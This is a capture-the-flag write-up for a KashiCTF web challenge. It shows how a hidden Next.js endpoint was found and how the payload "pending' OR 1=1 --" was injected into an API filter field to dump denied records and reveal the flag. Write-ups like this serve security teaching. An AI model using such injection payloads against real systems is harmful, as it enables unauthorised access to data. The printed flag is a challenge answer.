# Challenge description

The Request Management App is used to view all pending requests for each user. It’s a pretty basic website, though I heard they were working on something new.

Anyway, did you know that one of the disgruntled employees shared some company secrets on the Requests Management App, but it's status was set denied before I could see it. Please find out what it was and spill the tea!

# Soluce

## First step

We open the site with burp, to see all the requests.

When we open the site, we see that the site is a simple site with a list of requests. We can see that the site is a Next.js site. The route /api/list is used to get the list of requests. 

When querying the /api/list API, we found that it only returned requests with the status "pending", with no apparent option to see the "denied". 

Next.js JavaScript files (/_next/static/...) were examined for hidden API endpoints.

In the build-manifest.js file, we found the following:

```js
HTTP/1.1 200 OK
Cache-Control: public, max-age=31536000, immutable
Accept-Ranges: bytes
Last-Modified: Sat, 22 Feb 2025 14:37:35 GMT
ETag: W/"238-1952e17a004"
Content-Type: application/javascript; charset=UTF-8
Content-Length: 568
Vary: Accept-Encoding
Date: Sat, 22 Feb 2025 15:50:17 GMT
Connection: keep-alive
Keep-Alive: timeout=5

self.__BUILD_MANIFEST=function(e,r,s){return{__rewrites:{afterFiles:[],beforeFiles:[],fallback:[]},__routerFilterStatic:{numItems:0,errorRate:1e-4,numBits:0,numHashes:null,bitArray:[]},__routerFilterDynamic:{numItems:0,errorRate:1e-4,numBits:e,numHashes:null,bitArray:[]},"/":["static/chunks/pages/index-6413244cd5618b98.js"],"/_error":["static/chunks/pages/_error-fde50cb7f1ab27e0.js"],"/v2-testing":["static/chunks/pages/v2-testing-fb612b495bb99203.js"],sortedPages:["/","/_app","/_error","/v2-testing"]}}(0,0,0),self.__BUILD_MANIFEST_CB&&self.__BUILD_MANIFEST_CB();
```

We can see that there is a hidden API endpoint: /v2-testing

This endpoint also returns a list of requests, but with a different format.
When querying this endpoint, this automatically call that:

```http
POST /api/list-v2 HTTP/1.1
Host: kashictf.iitbhucybersec.in:6768
Content-Length: 13
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://kashictf.iitbhucybersec.in:6768
Referer: http://kashictf.iitbhucybersec.in:6768/v2-testing
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"filter":""}
```

Let's try to change the filter to "denied" to see if we can get the denied requests. This is not the case. 

Now let's try to do an SQL injection in the filter field.

```json
{ "filter": "pending' OR 1=1 --" }
```

This return that:

```json
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
ETag: "615nxdwhdu3bd"
Vary: Accept-Encoding
Date: Sat, 22 Feb 2025 16:25:55 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 4297

[{"employee_name":"robert.martin","request_detail":"Approve budget for Q4","status":"approved","department":"Finance","role":"Financial Analyst","email":"robert.martin@corp.com"},{"employee_name":"susan.clark","request_detail":"Request IT support for software update","status":"pending","department":"IT","role":"Software Engineer","email":"susan.clark@corp.com"},{"employee_name":"laura.jones","request_detail":"Propose restructuring of marketing strategy","status":"approved","department":"Marketing","role":"Marketing Manager","email":"laura.jones@corp.com"},{"employee_name":"daniel.wilson","request_detail":"Submit legal review for merger","status":"approved","department":"Legal","role":"Legal Advisor","email":"daniel.wilson@corp.com"},{"employee_name":"emily.davis","request_detail":"Oversee lab equipment procurement","status":"pending","department":"R&D","role":"Procurement Specialist","email":"emily.davis@corp.com"},{"employee_name":"james.brown","request_detail":"Plan office relocation","status":"approved","department":"Operations","role":"Operations Manager","email":"james.brown@corp.com"},{"employee_name":"patricia.lee","request_detail":"Organize annual compliance training","status":"approved","department":"Compliance","role":"Compliance Officer","email":"patricia.lee@corp.com"},{"employee_name":"kevin.harris","request_detail":"Set up new server infrastructure","status":"pending","department":"IT","role":"Network Engineer","email":"kevin.harris@corp.com"},{"employee_name":"olivia.king","request_detail":"Review vendor contracts","status":"denied","department":"Finance","role":"Accountant","email":"olivia.king@corp.com"},{"employee_name":"michael.scott","request_detail":"Coordinate regional sales conference","status":"approved","department":"Sales","role":"Regional Manager","email":"michael.scott@corp.com"},{"employee_name":"sarah.miller","request_detail":"Redesign corporate website","status":"approved","department":"Marketing","role":"Web Designer","email":"sarah.miller@corp.com"},{"employee_name":"steven.white","request_detail":"Negotiate supplier agreements","status":"pending","department":"Procurement","role":"Procurement Manager","email":"steven.white@corp.com"},{"employee_name":"alice.warren","request_detail":"Evaluate new HR policies","status":"approved","department":"HR","role":"HR Manager","email":"alice.warren@corp.com"},{"employee_name":"charles.davis","request_detail":"Revamp training program","status":"pending","department":"HR","role":"Training Coordinator","email":"charles.davis@corp.com"},{"employee_name":"paul.robinson","request_detail":"Upgrade security protocols","status":"approved","department":"Security","role":"Security Analyst","email":"paul.robinson@corp.com"},{"employee_name":"nancy.clarke","request_detail":"Analyze competitor strategies","status":"approved","department":"Strategy","role":"Business Analyst","email":"nancy.clarke@corp.com"},{"employee_name":"peter.johnson","request_detail":"Shitty job, I hate working here, I will leak all important information like KashiCTF{s4m3_old_c0rp0_l1f3_wbDQpmae}","status":"denied","department":"Logistics","role":"Supply Chain Manager","email":"peter.johnson@corp.com"},{"employee_name":"rebecca.adams","request_detail":"Migrate database to cloud","status":"pending","department":"IT","role":"Database Administrator","email":"rebecca.adams@corp.com"},{"employee_name":"tom.anderson","request_detail":"Set up employee wellness program","status":"approved","department":"HR","role":"Wellness Coordinator","email":"tom.anderson@corp.com"},{"employee_name":"harry.thomas","request_detail":"Investigate security breach","status":"approved","department":"Security","role":"Incident Response","email":"harry.thomas@corp.com"},{"employee_name":"linda.evans","request_detail":"Renew software licenses","status":"approved","department":"IT","role":"Software Asset Manager","email":"linda.evans@corp.com"},{"employee_name":"richard.collins","request_detail":"Draft public relations statement","status":"denied","department":"Public Relations","role":"PR Specialist","email":"richard.collins@corp.com"},{"employee_name":"barbara.jenkins","request_detail":"Approve recruitment plan","status":"pending","department":"HR","role":"Talent Acquisition Lead","email":"barbara.jenkins@corp.com"}]
```

We can see that the flag is: `KashiCTF{s4m3_old_c0rp0_l1f3_wbDQpmae}`, we have access to the denied requests.